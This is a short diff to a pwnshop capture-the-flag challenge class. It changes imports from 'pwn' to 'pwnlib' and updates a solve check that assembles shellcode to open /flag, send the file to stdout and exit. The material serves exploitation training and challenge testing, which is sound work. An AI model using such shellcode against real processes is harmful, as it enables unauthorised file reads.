@@ -1,5 +1,5 @@
 import pwnshop
-import pwn
+import pwnlib.asm, pwnlib.shellcraft
 import os
 
 class ShellBase(pwnshop.Challenge, register=False): # don't register this as an actual challenge
@@ -35,8 +35,8 @@ class ShellExample(ShellBase):
         Read 0x1000 bytes onto the stack (address varies every time that it is run)
         """
         with self.run_challenge(**kwargs) as process:
-            shellcode = pwn.asm(
-                pwn.shellcraft.open("/flag") + pwn.shellcraft.sendfile(1, 3, 0, 1024) + pwn.shellcraft.exit(0)
+            shellcode = pwnlib.asm.asm(
+                pwnlib.shellcraft.open("/flag") + pwnlib.shellcraft.sendfile(1, 3, 0, 1024) + pwnlib.shellcraft.exit(0)
             )
             process.write(shellcode)
             assert self.flag in process.readall()
